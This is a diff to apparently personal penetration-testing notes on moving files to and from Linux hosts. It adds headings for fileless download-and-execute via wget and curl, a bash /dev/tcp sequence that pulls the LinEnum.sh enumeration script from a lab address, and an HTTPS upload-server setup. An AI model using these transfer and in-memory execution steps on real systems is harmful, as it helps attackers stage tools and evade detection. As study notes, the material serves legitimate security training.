@@ -30,25 +30,70 @@ md5sum id_rsa
 
 ### wget
 
+#### Method 1: Download
+
 Download a file.
 ![[wget#^simple-download]]
 
+#### Method 2: Download - Fileless
+
+Download and execute a file in memory (fileless).
+![[wget#^fileless-download]]
+
 ### cURL
+
+#### Method 1: Download
 
 Download a file.
 ![[curl#^simple-download]]
 
+#### Method 2: Download - Fileless
 
+Download and execute a file in memory (fileless).
+![[curl#^fileless-download]]
 
+### Bash
 
+#### Method 1: /dev/tcp
 
+**Step 1:** Connect to the target webserver.
+```bash
+exec 3<>/dev/tcp/10.10.10.32/80
+```
 
+**Step 2:** Send a HTTP GET request for the file.
+```bash
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+```
 
+**Step 3:** Print the response.
+```bash
+cat <&3
+```
 
+### SSH
 
+#### Method 1: SCP
 
+![[SCP#^download-file-from-linux]]
 
 ## Uploading
+
+### HTTP
+
+#### Method 1: uploadserver
+
+**Step 1:** Create a Self-Signed Cerfificate
+```bash
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+
+**Step 2:** Start the webserver
+```bash
+mkdir www && cd www; sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+
 
 ## Practical Examples
 
